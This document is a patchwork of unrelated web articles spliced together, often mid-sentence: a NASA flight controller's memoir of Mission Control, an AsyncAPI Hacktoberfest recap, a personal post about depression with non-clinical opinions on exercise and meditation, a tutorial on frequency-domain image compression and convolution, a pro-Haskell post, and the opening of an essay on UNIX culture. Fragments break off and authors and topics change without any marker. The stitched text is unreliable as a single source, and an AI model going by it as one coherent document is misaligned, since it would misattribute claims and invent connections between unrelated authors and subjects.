<p>It was January of 1986, and I had just graduated from <a href="https://www.utexas.edu/" target="_blank" rel="noopener noreferrer nofollow">The University of Texas</a> with my <a href="https://www.ae.utexas.edu/" target="_blank" rel="noopener noreferrer nofollow">Aerospace Engineering</a> degree and started my dream job of working at NASA. It was still a couple of weeks before the ill-fated Challenger Accident, and my life was unfolding EXACTLY as I had wanted it to. As I arrived to my first assignment in Building 17, writing workstation trajectory software for what would become my <a href="https://balettie.com/fdo">Flight Dynamics Officer</a> brethren, I was taken over for a tour of Building 30 and the MCC.&nbsp;&nbsp;I’d be lying if I didn’t say that I was as excited as I could possibly be … but I wasn’t prepared for the actual experience of it.</p>
<p>I remember every bit of the thrill of officially using my newly-printed badge to gain access through the <a href="https://balettie.com/zenphoto/albums/miscellaneous-photos/nasa-johnson-space-center-october-2010/MCC%20entrance%20doors.jpg" data-rel="lightbox-gallery-dDUGFtmW" data-rl_title="" data-rl_caption="" title="">impressive lobby doors</a>, being “approved” for entrance into the society, as it were. Walking into what would be a surprisingly narrow stairway (because who really wanted to take the elevator?), and making our way up the stairs and into the hallways that surrounded the 2nd floor Flight Control Room (FCR, pronounced “ficker”).</p></div>

				<div><p>A quick side note — the actual “front room” in the MCC (the one that you see on television) has had a couple of different names over the years. It was originally called the Mission Operations Control Room (MOCR, pronounced “moaker”). However, when the Shuttle Program transitioned to operational status, it was decided that we were no longer flying missions, but flights – and thus the change. I can only presume they dropped “Operations”, because FOCR could have had some “unfortunate” pronunciations. Ha!</p>
<p>Also, you could always tell the “old guys” from the “new guys” that started with me around the mid-1980s by whether we used FCR or MOCR. 😀</p></div>

				<div><p>I’m not in any way trying to be sacrilegious here, but walking into the FCR (I was a “new guy”, obviously!) that very first time was an emotional and near-religious experience for me. I did my best to hide it from our guide, but knowing the reaction that others after me have had when I gave them their first tour into the MCC … I know I probably wasn’t able to do that.</p>
<p>I must’ve looked like a kid during their first Disney experience – wide-eyed and mouth open.</p>
<p>Honestly, I learned to look for that reaction every time I would take someone for their first MCC experience. When I would see that wide-eyed gaze (or sometimes just hear the barely audible gasp), I knew that it was best to just let them have that first few seconds of reaction to themselves. It would be something they’d remember forever.</p>

				<div><p>My first “Flight Experience” in the MCC came during the STS-26 Return To Flight mission. I had been developing trajectory software on the “new” HP-9000 workstations that were going to be used to supplement the Mission Operations Computer (I’ll write about both TOAST and the MOC another time), and STS-26 was the proof-of-concept flight. After the TDRS satellite deployment on FD1, TOAST would be used on an as-time-available basis by the teams. Of course, with any good first-time-use, they came across a couple of issues that needed some eyes-on assistance. So, I was able to go into the MCC during an actual mission.</p>
<p>That was a COMPLETELY DIFFERENT EXPERIENCE walking into the FCR when real-time operations were happening. No longer was it the quiet presence of history that you could physically feel. This was electric. Every console was an independent cluster of intense activity. Quiet conversations were happening all over the room. And yes – on the big screens at the front of the MCC – there was live video of astronauts in space. I even remember the small over-pressure in the FCR that resulted in a slight breeze as you opened the door to enter.</p>
<p><em>Toto, we’re not in Kansas any more.</em></p></div>

				<div>
				
				
				<div><p>I had already made up my mind that I was going to be a FDO before this experience, but my God – that locked it in!</p>
<p>Of course – my real work experience in the <a href="https://balettie.com/mcc/">MCC</a> came after my selection to be a <a href="https://balettie.com/fdo/">Flight Dynamics Officer</a>. We started (after lots of reading and orientation) with “backseating” on the console during simulations and flights – being able to listen to the multitude of conversations going through the headsets and trying to keep up was one of the greatest challenges.</p>
<p>Any acolyte who serves in a more traditional definition of a cathedral has certain trappings or outfits (robes, etc.) that they wear. For MCC Flight Controllers, that ubiquitous accoutrement was the headset. They had evolved somewhat from the over-the-head bracketed model to a smaller hooked-on-the-ear version, but the microphone boom was pretty much the same. Getting my first headset was like being officially welcomed to “the club” – I could now be recognized as someone who belonged whenever I put on my headset and plugged in!</p>
<p>Sitting behind and next to the more experienced FDOs as they went through the simulation or flight experience and watching them work – having them explain what they were doing – and knowing that one day soon I’d be taking on this responsibility, was somewhat surreal.</p></div>

				<div><p>Seeing it, being there during missions, and even simulating flights as part of the training and certification leading up to real-time Flight Control was nothing compared to that first time that I walked into FCR-1, headset and FDO “goodie book” in hand, knowing that I was about to plug in and be responsible for the trajectory operations for the Space Shuttle … at least for 9 hours or so. 🙂</p>
<p>Remember that “slight breeze” from the over-pressured FCR that I mentioned before? That day, it felt like a Cat 1 Hurricane. </p>
<p>Every single nerve ending was alert as I walked into the room – looking up at the displays up front for any indication of trouble. Fortunately, everything looked nominal and I almost had to remind myself to “breathe and keep walking” over to the FDO console. </p>
<p>Getting our shift change handover from the planning team, preparing for the upcoming satellite deployment we had (what a great first shift!!!), and then watching as that team left for the day, leaving us alone, well-prepared, and in charge.</p>
<p>It was that moment, headset fully plugged in, and making my first call back to DYNAMICS to run some MOC trajectory job, that I realized my time had come – I was finally and fully ordained.</p></div>

It was an exhausting but also a fascinating experience.</p><h2 id="hacktoberfest-is-ok">Hacktoberfest Is Ok</h2><p>Don't be afraid of <a href="https://hacktoberfest.digitalocean.com/">Hacktoberfest</a>. It is an excellent event for both contributors and maintainers.</p><p>There are <a href="https://blog.domenic.me/hacktoberfest/">haters</a> that will tell you something different. My advice, follow <a href="https://en.wikipedia.org/wiki/Truncated_mean">truncated mean</a> measure and always discard extreme opinions, especially if they call for boycotting:</p><blockquote><p>Finally, and most importantly, we can remember that this is how DigitalOcean treats the open source maintainer community, and stay away from their products going forward</p></blockquote><p>Cancel culture at its best. The fact that someone is good at programming or works at Google or Facebook doesn't make them experts in everything. Remember that celebrities are not good candidates for a role model.</p><p>There are no perfect events; there are no best solutions. There is always a place for improvement, but it should be followed by open, civilized discussion.</p><p>Let me conclude by saying that I hope the "harm to the open source made by DigitalOcean" is not as significant as the harm that such hate does to open source by discouraging new open-source contributors. However, this is just speculation. How can I consider any of these things harmful if I did not conduct scientific research? I can only confirm that Hacktoberfest did not harm <a href="https://www.asyncapi.com/">AsyncAPI Initiative</a>. On the contrary, it was pretty neat.</p><h2 id="spam">Spam</h2><p>During the entire event, we had only two spam PRs. I can imagine that a much more popular and known project might have had more. Nevertheless, adding the <strong>invalid</strong> label and closing a PR is a super simple operation, three clicks.</p><p>The definition of spam heavily depends on maintainers. For example, <a href="https://github.com/facebook/react/pull/19953">this</a> is not invalid to me, because I don't think of grammar as "subjective nits".</p><h2 id="why-we-participated-in-hacktoberfest">Why We Participated in Hacktoberfest</h2><p>Our intentions were pretty clear from the very beginning. As I wrote in the <a href="https://www.asyncapi.com/blog/hacktoberfest-2020">previous post</a>, we wanted to:</p><ul><li>Promote <a href="https://www.asyncapi.com/">AsyncAPI Initiative</a> as a place where we work not only on the AsyncAPI specification, but also lots of tools</li><li>Help members of the broader open-source community make their first contributions in a friendly environment</li></ul><p>My impression is that sometimes the open-source is perceived as a kind of elite gathering. <strong>This is quite often blocking people from joining because they feel they cannot help but rather waste others' time.</strong> I was there in the past, I thought the same. It's just another variation of the damn <a href="https://en.wikipedia.org/wiki/Impostor_syndrome">impostor syndrome</a>. You can always help, no matter what your experience is.</p><p>Start small. Don't start with tasks that can be overwhelming. Don't throw yourself into the deep end. </p><p>We wanted to help others make first baby steps in a secure and inclusive environment, with lots of patience and support.</p><h2 id="what-it-takes-to-have-70-prs-merged">What It Takes To Have 70 PRs Merged</h2><p>It is not enough to label 70 issues with the <strong>hacktoberfest</strong><undefined> label, sorry <span role="img" aria-label="smiling face with open mouth">😃</span></undefined></p><p>First of all, you need to be passionate about open source and dedicated to what you do. It can't just be a task that somebody assigned to you. It would help if you were prepared to treat Hacktoberfest participants as a priority. I would compare it to the onboarding process of new hires. </p><p>Of course, not all participants join to stay longer, usually they just follow the  "one pull request, and I'm out of here" approach.</p><p>It doesn't matter. </p><p>Please don't make assumptions; assumptions are evil. Be opened, treat every contribution equally, and remember that the onboarding process is a crucial element. If you fail with the onboarding process, you fail big time at the very beginning.</p><h3 id="what-we-prepared">What We Prepared</h3><p>We prepared the following materials for potential participants:</p><ul><li><a href="https://www.asyncapi.com/blog/hacktoberfest-2020">Blog post</a> about our participation</li><li><a href="https://www.youtube.com/playlist?list=PLbi1gRlP7pigFSE_6G88x0t12HFLU4A4b">Onboarding videos</a> that explain how to start</li><li>78 issues from more than 30 repositories and put them all in one <a href="https://docs.google.com/spreadsheets/d/1vX4J395apexutfQ0OSqPNltFKDacmemHZwCmOXwHNLo/">list</a> with additional information about the difficulty level or the technical area,</li></ul><p>It took me around eight workdays to do it all. The most time-consuming part was to go through all the issues, pick candidates, create new ones, and group them all in a Google Sheet.</p><h3 id="what-we-did-during-the-event">What We Did During The Event</h3><p><undefined>70 pull requests mean —at least— 70 reviews <span role="img" aria-label="smiling face with open mouth &amp; cold sweat">😅</span></undefined></p><p>If you know your project well, it is not very time-consuming, and anyway, it is the work you have to do as a maintainer. I do not count this time as an extra Hacktoberfest effort. Of course, it can be overwhelming if this is not a standard amount of PRs that you get every month.</p><p>We also hosted <a href="https://www.youtube.com/playlist?list=PLbi1gRlP7pigZP2da6zbDT2YU7glQOTPH">office hours</a> for participants. This was fun, and we wanted to start doing live streams about AsyncAPI anyway.</p><p>Last but not least, once a week, I advertised our project on the official Hacktoberfest Discord server.</p><p><a href="https://github.com/asyncapi/vscode-extension/pull/8#issuecomment-719759737"><img src="https://www.asyncapi.com/img/posts/hacktoberfest-summary-2020/feedback-sharkham.webp"></a></p><p>It looks like we do not need to do more for the next year.</p><h2 id="was-it-worth-it">Was It Worth It</h2><p>Hell yeah, and I'm already looking forward to Hacktoberfest 2021.</p><p>It was great to see so many different people interacting with the project and seeing we reached our goal.</p><p><a href="https://github.com/asyncapi/html-template/pull/98#issuecomment-709014754"><img src="https://www.asyncapi.com/img/posts/hacktoberfest-summary-2020/feedback-juergenbr.webp"></a></p><p>We got some new features, CI/CD cleanup in all repositories, and solved many trivial SonarCloud-reported issues that we would never found time to solve.</p><h2 id="what-made-it-such-a-success">What Made It Such a Success</h2><p>Our success was a typical return on investment.</p><p><a href="https://github.com/asyncapi/playground/pull/38#issuecomment-710014222"><img src="https://www.asyncapi.com/img/posts/hacktoberfest-summary-2020/feedback-Orodan.webp"></a></p><p>We asked all contributors to provide feedback on how they learned about us and what was the most helpful resource. 20 out of 26 responded to our request.</p><figure><img src="https://www.asyncapi.com/img/posts/hacktoberfest-summary-2020/how-they-learned.webp"><p>Figure 1: Ways in which the contributors learned about AsyncAPI participating in Hacktoberfest</p></figure><p>I think it is pretty clear that introducing the official Discord channel was a great idea. I personally do not like Discord because of the lack of support for threads, but better this than nothing.</p><figure><img src="https://www.asyncapi.com/img/posts/hacktoberfest-summary-2020/what-they-used.webp"><p>Figure 2: Resources helpful for contributors</p></figure><p>Such a simple thing as a Google Sheet with a list of issues grouped by different factors was, in the end, our best resource for contributors. I encourage you to create such a sheet for your contributors next year.</p><h2 id="open-request-to-hacktoberfest-organizers">Open Request to Hacktoberfest Organizers</h2><p>There is one thing that calls for an improvement for next year. Just one? Yeah, opt-in solution for projects that want to participate in Hacktoberfest was addressed during this event, and I assume it stays on.</p><p>The number of projects that people can work on is overwhelming, and finding the right issue seems very difficult. Please have a look at the feedback we got from our contributors. It is enough to develop an official application where potential contributors can adequately filter out issues by technology and difficulty. In the end, it doesn't make sense for all maintainers to work on their own Google Sheets and post it on Discord. A better way would be to introduce an app for all.</p><h2 id="hall-of-fame">Hall Of Fame</h2><p>Below you can find a list of all contributors that joined AsyncAPI during Hacktoberfest and contributed their time to the project.

Around the 10th of January, with a lot of help from my wife, I was able to fight the disease.</p><blockquote><p>I think that my boss got sick because of that and was not able to spend time with his newborn child. I feel terrible because of that. So, Alan, if you are reading this, I am sorry.</p></blockquote><p>Then, the rest of the month I spent in a mild depression. It was the worst mood and the hardest time I've had in my life, psychologically. To be honest with you, I still don't fully understand why. I have been under mild stress due to a whole bunch of reasons, the main one is financial instability, of course. I have a feeling this might be one of the most popular reasons for sadness. This has been going on for a while, but mostly my mood has been fine, more or less. I guess something happened that sent me to the rock bottom, psychologically speaking.</p><p>I am okay now. In fact, I am better than before. Much better. I now wake up super early, which I was never able to do. I exercise almost every morning. I work on my personal projects before I go to work. I eat healthy foods. I have a great relationship with my wife. Everything seems to be going fine now.</p><p>In this post, I wanted to share some of my reflections on the depressive state that I went through. I'd like to share some of my thoughts that were running through my head and what helped me get over the sadness. I hope this is useful.</p><h2 id="common-advice">Common Advice</h2><p>I want to start with a brief list of things that one might find when searching the web for "How to deal with Depression."</p><h3 id="exercise">Exercise</h3><p>It can be very annoying to search online for a solution and get the same advice over and over. Exercise, exercise, exercise.</p><p>Will you stop, please? Look, I know exercise is good. In fact, I like to exercise, it makes me feel good. But, when you are depressed, you don't want to exercise. You really don't. If, during my depressive state, I do have a glimpse of hope and light, I will exercise. Will it make me feel better? Probably. Will it solve my bigger problem? It won't! It won't because solutions like exercise work only when done regularly. You can't expect a person dealing with mood swings to exercise regularly. It just does not work that way.
What will happen to a depressed person who was told to exercise, but failed to do that? It will only lead to a worse condition.</p><p>Exercise is great. Everyone knows exercise is great for your body and mind. However, it is only great for a person who is not struggling with too many things at ones. Please, stop recommending people exercise when they are depressed. It is not a solution to the problem.</p><h3 id="meditate">Meditate</h3><p>The problem here is the same. I know it is good for me. In my case, I actually enjoy it. But in times of great sadness, I can't make myself do it.</p><h2 id="fighting-the-battle">Fighting the battle</h2><p>Every single fucking day, I had to battle myself, my mood. Most of the time, I win the battle, but many times I don't. The only solution to this is not to have one at all. If you think about it, no human can win each time they fight something. It is impossible, you won't have the stamina to do that, and eventually, you give up. So, the only solution that comes to mind is not to have the battle at all.</p><p>The only problem with that is that it is easy to say that, but hard to do. When you are depressed, it doesn't feel like you have much control over your body, over your thoughts. So what should you do?</p><h3 id="go-easy-on-yourself">Go easy on yourself</h3><p>Look, I'm no doctor, I don't know what the cause for your sadness/depression is. For me, it was that I took on too many projects, too many responsibilities.</p><p>One thing that helped me was going easy on myself. After a couple of days of beating myself up, I decided to drop half of my projects, half of my attempt to build good habits, it was too much.</p><p>I made sure to enjoy junk food, even after finishing it. I tried really hard not to worry about watching too much television. I stopped worrying about missing exercise for a week. I decided to drop all my worries and enjoy whatever it is I was doing. In a lot of cases, it was nothing, just sitting on a sofa eating junk food.</p><p>That helped me a lot. Now, I'm back on track to build some good habits, but this time I'm making sure not to overdo it. Taking a step at a time.</p><h3 id="other-people">Other people</h3><p>Another useful tool that helped me get my mood, my desire to do things back was listening to other people. In my case, those people were Jordan Peterson and DHH.</p><p>Jordan Peterson has some incredibly useful and insightful thoughts on leaving a good life and on depression specifically. A couple of videos of his lectures I found on YouTube have been crucial in my recovery.</p><p>DHH is one of my role models. I find that most of his thoughts and beliefs that he shares align with mine. Whenever I lose track of who I am and what is important for me, I will listen to one of his podcasts, and it will almost certainly make me feel better and more strong.</p><p>I recommend that you find people that inspire you, and that makes you remember who you are and what it means to be a good person.</p><h2 id="some-resources-that-helped-me">Some resources that helped me</h2><h3 id="jordan-peterson---how-to-deal-with-depression--powerful-motivational-speech">Jordan Peterson - <a href="https://www.youtube.com/watch?v=Xm_2zmX6Akc" target="_blank" rel="nofollow noopener noreferrer">How To Deal With Depression | Powerful Motivational Speech</a></h3><h4 id="500---700">5:00 - 7:00</h4><ul><li>You want to constraint the negative event to the smallest domain possible.</li></ul><blockquote><p>It is going to be hard, no question about that.

<p>Over 4 years ago I wrote a short blog post on images in the frequency domain: <a href="https://blog.demofox.org/2016/07/28/fourier-transform-and-inverse-of-images/" rel="nofollow">https://blog.demofox.org/2016/07/28/fourier-transform-and-inverse-of-images/</a></p>



<p>It’s time to revisit the topic a bit and add some more things.</p>



<p>If you are curious about how the Fourier transform works, which can transform images or other data into the frequency domain, give this a read: <a href="https://blog.demofox.org/2016/08/11/understanding-the-discrete-fourier-transform/" rel="nofollow">https://blog.demofox.org/2016/08/11/understanding-the-discrete-fourier-transform/</a></p>



<p>The C++ code that goes with this blog post can be found at <a href="https://github.com/Atrix256/FrequencySpaceImages" rel="nofollow">https://github.com/Atrix256/FrequencySpaceImages</a></p>



<h2>Image Compression</h2>



<p>When you transform an image into the frequency domain, you get a complex number (with a real and imaginary component) per pixel that you can use to get information about the frequencies (literal sine and cosine waves) that go into making the image.  One piece of information is the “phase” or starting angle of that wave.  You get the phase by using atan2(imaginary, real).  The other piece of information is the “amplitude” of that wave, or how large the wave is in the image. The amplitude is the length of the 2d vector (real, imaginary).</p>



<p>A quick and easy way to do image compression then, is to convert an image to frequency space, find the lowest amplitude frequencies and throw them away – literally zero out the complex number.  If you throw enough of them away, it’ll take less data to describe the frequency content of an image, than the pixels of the image, and you’ll have compressed the image.</p>



<p>The more aggressive you are at throwing away frequencies though, the more the image quality will degrade.  This is “lossy” compression and is a simplified version of how jpg image compression works.  Lossy compression is in contrast to lossless compression like you find in png files, which use something more like a .zip compression algorithm to perfectly encode all the source data.</p>



<p>In the code that goes with this post, the DoTestZeroing() function throws out the lowest 10% amplitude frequencies, then the lowest 20%, then 30% and so on up to 90%.  At each stage, it writes all complex frequency values out into a binary file, which can then be compressed using .zip as a method for realizing the image compression.  As the data gets more zeros, it gets more compressible.</p>



<p>The top row in the image below shows an original 512×1024 image, the DFT amplitude information, and the DFT phase information.  The bottom row shows the same, but for an image which has had it’s lower 90% amplitude frequencies thrown away.  The DFT data is 8MB for both (uncompressed), and compresses to 7.7MB for the top picture, but only 847KB for the bottom picture.  The inverse DFT was used to turn the modified frequency data on the bottom back into an image.</p>

<p>Here is another image which is 512×512 and has DFT which is 4MB uncompressed.  The top image’s DFT data compresses to 3.83MB, while the bottom compresses to 438KB.</p>

<p>While fairly effective, this is also a pretty naive way of doing frequency based image compression!</p>



<p>More sophisticated methods use the “Discrete Cosine Transform” or DCT instead of the DFT because it tends to make more of the frequency magnitudes zero, consolidating the data into fewer important frequencies, which means it’s already smaller before you start throwing away frequencies. DCT and DFT also pretend that the images go on forever, instead of just stopping at the edge.  DFT acts as if those images repeat in a tiled fashion, while DCT acts as if they are mirrored at each repeat, which can also be a nice property for image quality.</p>



<p>Other methods break an image up into blocks before doing frequency based compression.  Also, you can use wavelets to compress images, or principle component analysis or singular value decomposition.  You can also fit your image with “whatever” basis functions you want, using L1 norm regularization to promote the coefficients of your fitting to be zero, to make the fit data be less sparse, just like DCT does compared to DFT.</p>



<p>Another thing you can do is use compressed sensing to skip a couple steps: You take a couple randomized but roughly evenly spaced samples from the image (blue noise or LDS are going to be good options here), and then you can eg find Fourier basis coefficients (DFT!) that match the sparse/irregular data samples you took.   This is like throwing out low frequencies, but without having to DFT the whole data set, and then throw things out.  It starts with sparse data and then fits it.</p>



<p>Bart Wronski has several write ups on his blog in this area, so give them a read if you are interested: <a href="https://bartwronski.com/2020/08/30/compressing-pbr-texture-sets-with-sparsity-and-dictionary-learning/" rel="nofollow">https://bartwronski.com/2020/08/30/compressing-pbr-texture-sets-with-sparsity-and-dictionary-learning/</a></p>



<p>This is a great read showing how to fit data using L1 regularization and all the related information you might be interested in: <a href="https://www.analyticsvidhya.com/blog/2017/06/a-comprehensive-guide-for-linear-ridge-and-lasso-regression/" rel="nofollow">https://www.analyticsvidhya.com/blog/2017/06/a-comprehensive-guide-for-linear-ridge-and-lasso-regression/</a></p>



<p>This video is a great overview of the random grab bag of other things I mentioned: <a href="https://www.youtube.com/watch?v=aHCyHbRIz44&amp;feature=youtu.be" rel="nofollow">https://www.youtube.com/watch?v=aHCyHbRIz44&amp;feature=youtu.be</a></p>



<h2>Image Filtering</h2>



<p>In my previous post on this topic I showed how you could throw away frequencies that were farther than a certain distance from the center to low pass filter an image, aka blur it.  I also showed how if you threw away frequencies closer than a certain distance, it would high pass filter an image, aka sharpen it.</p>



<p>That throwing away of frequency data based on distance is the same as multiplying the frequency data by a mask which has a 1.0 in some places and a 0.0 in others.  You can generalize this to multiply frequencies by any number.  In the below I restrict the multiplications to be between 0 and 1, but you could definitely go to larger numbers or even go to negative numbers if you wanted.</p>



<p>The below shows the patterns that the images are multiplied by in this section. Top row left to right is a low pass filter, then a stronger low pass filter (gets rid of more high frequencies than the other) and lastly is a notch filter or “band stop” filter.  The bottom row is the complement, such that you get the bottom by subtracting the image from white (1.0).  Left to right, the bottom row is a high pass filter, then a weaker high pass filter (lets more low frequencies in) and then a band pass filter which only lets certain frequencies through.</p>

<p>First up is the “Loki and Alan” picture. Frequencies and actual picture values filtered from the pictures on the top are present in the pictures on the bottom and vice versa. In this way, blurring compared to sharpening (and edge detection) are two sides of the same coin. It just matters which part you throw away and which part you keep.</p>

<p>Here is what the frequency magnitudes look like. Note that each image has the magnitudes put through a log function, and also normalized to be 1.0 max. This is why even though the high pass filters (and band pass) darken the middle, it doesn’t seem like it. The renormalization obscures that fact a bit, and the middle is brightest (largest amplitudes) which we saw when throwing out the lowest amplitudes in the last section.</p>

<h2>Image Convolution</h2>



<p>In the last section, we made “images” by using a distance function, to make values to multiply the frequencies by to filter out certain frequencies.</p>



<p>In this section, we are going to take two images, put them into frequency space, multiply them together, take them out of frequency space, and see what kind of results come out.</p>



<p>There is something called the “convolution theorem” which tells us that multiplication in the frequency domain, is the same as convolution between the images.  Convolution is an expensive operation, because you have to loop through all the pixels of one image, and at each pixel, loop through the pixels of the other image, and do some multiplications and additions. Convolution is so slow, that it can actually be quicker to take two images you want convolved to frequency domain, multiply them together, and then take them out of frequency space to be images again.</p>



<p>Convolution is used in graphics for things like blurs, sharpening, or applying bokeh for depth of field, so speeding it up can be a big help!  Convolution is also used in audio for things like reverberation which makes audio sound like it was played inside of a cave or a big cathedral.</p>



<p>Technical note: the “kernel” image needs to be centered at pixel (0,0), not the center of the image.  Also, the kernel image should be normalized so that summing up all of it’s pixels adds up to 1.0.  You also need to zero pad (add a black pixel border to) both the source image and kernel image to be the size of source+kernel+1 on the x and y axis before DFT’ing so they are the same size, and to avoid wrapping problems.  After you are done multiplying and inverse DFT’ing, you can remove the black border again.</p>



<p>Here are the 4 images we are going to use as kernel images: A star, a plus, a circle, and a blob.</p>

<p>Here are the DFT magnitudes of those images.</p>

<p>Here is the “Loki and Alan” picture convolved with those kernel images.</p>



<figure><a href="https://demofox2.files.wordpress.com/2020/11/lokialanconv.png"><img data-attachment-id="12653" data-permalink="https://blog.demofox.org/lokialanconv/" data-orig-file="https://demofox2.files.wordpress.com/2020/11/lokialanconv.png" data-orig-size="1024,2048" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="lokialanconv" data-image-description="" data-medium-file="https://demofox2.files.wordpress.com/2020/11/lokialanconv.png?w=150" data-large-file="https://demofox2.files.wordpress.com/2020/11/lokialanconv.png?w=512" src="https://demofox2.files.wordpress.com/2020/11/lokialanconv.png" alt=""></a></figure>



<p>You can see that the images somehow take on the qualities of the kernel… the star one is very angular, the plus one is very “plus like” and the circular one is very circular.  Note how the blob acts a lot like a low pass filter!  In frequency space, it does actually look like one, so that makes sense:</p>

<p>Here is the scenery picture convolved by the same shapes.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There’s been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it’s ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That’s how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It’s really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it’s highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it’s finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there’s now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it’s finally ready to conquer the world.

<p><em>Original article:</em> <a href="http://www.wenet.net/~scoville/PCarticle.html">http://www.wenet.net/~scoville/PCarticle.html</a></p>

<p><strong>If there's nothing different about UNIX people, how come so many were liberal-arts majors?<br> It's the love of words that makes UNIX stand out.</strong></p>

<p><a href="mailto:scoville@hooked.net">Thomas Scoville</a></p>

<p>In the late 1980s, I worked in the advanced R&amp;D arm of the Silicon Valley's regional telephone company.  My lab was populated mostly by Ph.D.s and gifted hackers.  It was, as you might expect, an all-UNIX shop.</p>

<p>The manager of the group was an exception: no advanced degree, no technical credentials.  He seemed pointedly self-conscious about it.  We suspected he felt (wrongly, we agreed) underconfident of his education and intellect.  One day, a story circulated through the group that confirmed our suspicions: the manager had confided he was indeed intimidated by the intelligence of the group, and was taking steps to remedy the situation.  His prescription, though, was unanticipated: “I need to become more of an intellectual,” he said. “I'm going to learn UNIX.”</p>

<p>Needless to say, we made more than a little fun out of this.  I mean, come on: as if UNIX could transform him into a mastermind, like the supplicating scarecrow in “The Wizard of Oz.”  I uncharitably imagined a variation on the old Charles Atlas ads: “Those senior engineers will never kick sand in my face again.”</p>

<p>But part of me was sympathetic: “The boss isn't entirely wrong, is he?  There is something different about UNIX people, isn't there?” In the years since, I've come to recognize what my old manager was getting at.  I still think he was misguided, but in retrospect I think his belief was more accurate than I recognized at the time.</p>

<p>To be sure, the UNIX community has its own measure of technical parochialism and nerdy tunnel vision, but in my experience there seemed to be a suspicious overrepresentation of polyglots and liberal-arts folks in UNIX shops.  I'll admit my evidence is sketchy and anecdotal.  For instance, while banging out a line of shell, with a fellow engineer peering over my shoulder, I might make an intentionally obscure literary reference:</p>

<pre>if test -z `ps -fe | grep whom`
then 
echo ^G 
fi
# Let's see for whom the bell tolls.</pre>

<p>UNIX colleagues were much more likely to recognize and play in a way I'd never expect in the VMS shops, IBM's big-iron data centers, or DOS ghettos on my consulting beat.</p>

<p>Being a liberal-arts type myself (though I cleverly concealed this in my resume), I wondered why this should be true.  My original explanation — UNIX's historical association with university computing environments, like UC Berkeley's — didn't hold up over the years; many of the UNIX-philiacs I met came from schools with small or absent computer science departments.  There had to be a connection, but I had no plausible hypothesis.</p>

<p>It wasn't until I started regularly asking UNIX refuseniks what they didn't like about UNIX that better explanations emerged.</p>

<p>Some of the prevailing dislike had a distinctly populist flavor — people caught a whiff of snobbery about UNIX and regarded it with the same proletarian resentment usually reserved for highbrow institutions like opera or ballet.  They had a point: until recently, UNIX was the <em>lingua franca</em> of computing's upper crust.  The more harried, practical, and underprivileged of the computing world seemed to object to this aura of privilege. UNIX adepts historically have been a coddled bunch, and tend to be proud of their hard-won knowledge.  But these class differences are fading fast in modern computing environments.  Now UNIX engineers are more common, and low- or no-cost UNIX variations run on inexpensive hardware.  Certainly UNIX folks aren't as coddled in the age of NT.</p>

<p>There was a standard litany of more specific criticisms: UNIX is difficult and time-consuming to learn.  There are too many things to remember.  It's arcane and needlessly complex.</p>

